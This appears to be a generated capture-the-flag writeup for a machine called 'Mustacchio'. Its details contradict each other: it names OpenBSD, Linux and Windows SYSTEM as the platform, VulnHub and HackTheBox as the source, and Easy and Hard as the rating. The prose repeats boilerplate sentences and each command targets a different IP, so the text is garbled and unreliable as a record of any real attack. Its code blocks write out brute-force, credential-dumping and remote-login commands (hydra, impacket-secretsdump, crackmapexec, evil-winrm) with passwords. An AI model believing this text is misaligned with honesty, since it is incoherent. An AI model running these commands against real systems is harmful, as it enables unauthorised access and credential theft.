---
TitleSEO: "VulnHub — Mustacchio (Easy OpenBSD) | ZureFX"
TitlePost: "VulnHub — Mustacchio (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Mustacchio. DCSync and Open Redirect to achieve easy compromise on OpenBSD."
Keywords: "hard, easy, hackthebox, web, linux"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-360.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-360/"
Date: "2025-06-16"
Tags: "Hard, Easy, HackTheBox, Web, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-360"
Permalink: "/writeups/htb-mustacchio-360.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Easy** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.34.118.210`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p135,8443,587 10.108.247.241 -oN scan.txt
evil-winrm -i 10.123.176.109 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.121.231.29 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p3306,389,135 10.34.2.186 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.54.139 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.64.112.59 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.51.189.217
```

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p1433,3268,143 10.24.174.125 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.44.55 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

Key finding: **Local File Inclusion**.

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.91.178.164 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Privilege Escalation

### Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.70.210.90 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.123.228
```

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `socat`
- `impacket`
- `ligolo-ng`
- `john`
- `metasploit`
- `kerbrute`
- `ldapsearch`

### Key Takeaways

- DCSync
- Open Redirect
- Local File Inclusion
